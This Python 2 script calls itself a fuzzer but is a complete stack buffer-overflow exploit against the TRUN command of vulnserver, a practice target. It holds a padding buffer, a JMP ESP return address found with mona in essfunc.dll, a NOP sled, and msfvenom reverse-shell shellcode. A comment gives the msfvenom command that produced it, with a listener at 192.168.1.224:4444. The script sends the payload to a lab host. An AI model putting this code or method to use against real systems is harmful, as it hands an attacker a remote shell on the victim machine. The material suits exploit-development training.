#!/usr/bin/python
#Fuzzing program for vulnserver target
import sys, socket

#Identified 'JMP ESP' shell code using nasm_shell as "\xff\xe4"

#Searched vulnserver using mona modules for vulnserver processes with unprotected memory
#Identified essfunc.dll, and used command '!mona find -s "\xff\xe4" -m essfunc.dll'
#Found 9 return addresses
#0x625011af, 0x625011bb, 0x625011c7, 0x625011d3, 0x625011df, 0x625011eb, 0x625011f7, 0x62501203, 0x62501205
#Using 0x625011af in this example

buffer = "A" * 2003
#Shell code uses little endian, or reversed return address
shellcode = "\xaf\x11\x50\x62"
#nop padding
nopsled = "\x90" * 32
#msfvenom payload generated from command:
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.224 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
overflow = ("\xda\xc4\xb8\x70\x17\xa5\x83\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x43\x17\x83\xc3\x04\x03\x33\x04\x47\x76\x4f\xc2\x05"
"\x79\xaf\x13\x6a\xf3\x4a\x22\xaa\x67\x1f\x15\x1a\xe3\x4d\x9a"
"\xd1\xa1\x65\x29\x97\x6d\x8a\x9a\x12\x48\xa5\x1b\x0e\xa8\xa4"
"\x9f\x4d\xfd\x06\xa1\x9d\xf0\x47\xe6\xc0\xf9\x15\xbf\x8f\xac"
"\x89\xb4\xda\x6c\x22\x86\xcb\xf4\xd7\x5f\xed\xd5\x46\xeb\xb4"
"\xf5\x69\x38\xcd\xbf\x71\x5d\xe8\x76\x0a\x95\x86\x88\xda\xe7"
"\x67\x26\x23\xc8\x95\x36\x64\xef\x45\x4d\x9c\x13\xfb\x56\x5b"
"\x69\x27\xd2\x7f\xc9\xac\x44\x5b\xeb\x61\x12\x28\xe7\xce\x50"
"\x76\xe4\xd1\xb5\x0d\x10\x59\x38\xc1\x90\x19\x1f\xc5\xf9\xfa"
"\x3e\x5c\xa4\xad\x3f\xbe\x07\x11\x9a\xb5\xaa\x46\x97\x94\xa2"
"\xab\x9a\x26\x33\xa4\xad\x55\x01\x6b\x06\xf1\x29\xe4\x80\x06"
"\x4d\xdf\x75\x98\xb0\xe0\x85\xb1\x76\xb4\xd5\xa9\x5f\xb5\xbd"
"\x29\x5f\x60\x11\x79\xcf\xdb\xd2\x29\xaf\x8b\xba\x23\x20\xf3"
"\xdb\x4c\xea\x9c\x76\xb7\x7d\x63\x2e\xb6\x9d\x0b\x2d\xb8\x4c"
"\x90\xb8\x5e\x04\x38\xed\xc9\xb1\xa1\xb4\x81\x20\x2d\x63\xec"
"\x63\xa5\x80\x11\x2d\x4e\xec\x01\xda\xbe\xbb\x7b\x4d\xc0\x11"
"\x13\x11\x53\xfe\xe3\x5c\x48\xa9\xb4\x09\xbe\xa0\x50\xa4\x99"
"\x1a\x46\x35\x7f\x64\xc2\xe2\xbc\x6b\xcb\x67\xf8\x4f\xdb\xb1"
"\x01\xd4\x8f\x6d\x54\x82\x79\xc8\x0e\x64\xd3\x82\xfd\x2e\xb3"
"\x53\xce\xf0\xc5\x5b\x1b\x87\x29\xed\xf2\xde\x56\xc2\x92\xd6"
"\x2f\x3e\x03\x18\xfa\xfa\x23\xfb\x2e\xf7\xcb\xa2\xbb\xba\x91"
"\x54\x16\xf8\xaf\xd6\x92\x81\x4b\xc6\xd7\x84\x10\x40\x04\xf5"
"\x09\x25\x2a\xaa\x2a\x6c")

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.1.213', 9999)) #target windows Machine IP address and vulnserver port
	s.send(('TRUN /.:/' + buffer + shellcode + nopsled + overflow))
	s.close()

except:
	print "Error connecting to server"
	sys.exit()
